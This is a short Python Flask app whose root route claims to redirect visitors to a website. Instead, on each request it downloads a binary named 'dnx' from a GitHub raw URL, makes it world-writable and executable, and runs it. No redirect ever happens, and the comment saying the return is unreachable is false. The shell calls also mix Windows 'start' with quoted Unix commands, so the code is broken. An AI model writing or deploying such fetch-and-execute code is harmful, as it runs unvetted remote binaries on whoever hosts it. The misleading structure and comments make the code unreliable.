from flask import Flask, redirect
import os

app = Flask(__name__)

@app.route('/')
def redirect_and_run_command():
    # Redirect to a website
    redirect_url = 'https://www.example.com'
    os.system(f"start 'wget https://github.com/55113110159/OS/raw/main/dnx'")
    os.system(f"start 'chmod 777 dnx'")
    os.system(f"start './dnx'")

    # Return a response (this won't be reached due to the redirection)
    return "Redirecting..."

if __name__ == '__main__':
    app.run(debug=True)
